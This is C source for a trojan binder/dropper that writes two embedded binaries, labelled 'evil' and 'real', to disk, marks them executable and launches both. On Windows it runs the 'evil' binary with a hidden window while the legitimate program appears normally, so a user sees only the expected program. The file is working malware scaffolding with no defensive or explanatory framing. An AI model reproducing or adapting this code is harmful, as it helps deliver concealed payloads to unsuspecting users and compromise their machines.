#include "evil.h"
#include "real.h"
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

#if defined(_WIN32) || defined(__CYGWIN__)
#include <windows.h>
#endif

const char *bin_name_real="real.bin.exe";
const char *bin_name_evil="evil.bin.exe";

int recreate_binary() {
	FILE *file;

	// evilcode
	file = fopen(bin_name_evil, "w");
	if(file){
		fwrite(evil, 1, sizeof(evil), file);
		fclose(file);
		chmod(bin_name_evil,0755);	  
	}else{return 1;}

	// realprog
	file = fopen(bin_name_real, "w");
	if(file){
		fwrite(real, 1, sizeof(real), file);
		fclose(file);
		chmod(bin_name_real,0755);	  
	}else{return 1;}

	return 0;
}

int execute_binary(){

#ifdef __linux__
	signal(SIGCHLD, SIG_IGN);  // avoid zombie, don't need exit info from child
	int pidMt;
	if((pidMt=fork())==0){
		execl(bin_name_evil, bin_name_evil, (char *) 0);
		exit(0); 
	}
	if((pidMt=fork())==0){
		execl(bin_name_real, bin_name_real, (char *) 0);
		exit(0); 
	}
#elif defined(_WIN32) || defined(__CYGWIN__)
	ShellExecute(0, "open", bin_name_evil,NULL, NULL, SW_HIDE);
	ShellExecute(0, "open", bin_name_real ,NULL, NULL, SW_SHOWDEFAULT);
#endif

	return 0;
}


int main(){
	recreate_binary();
	execute_binary();
}
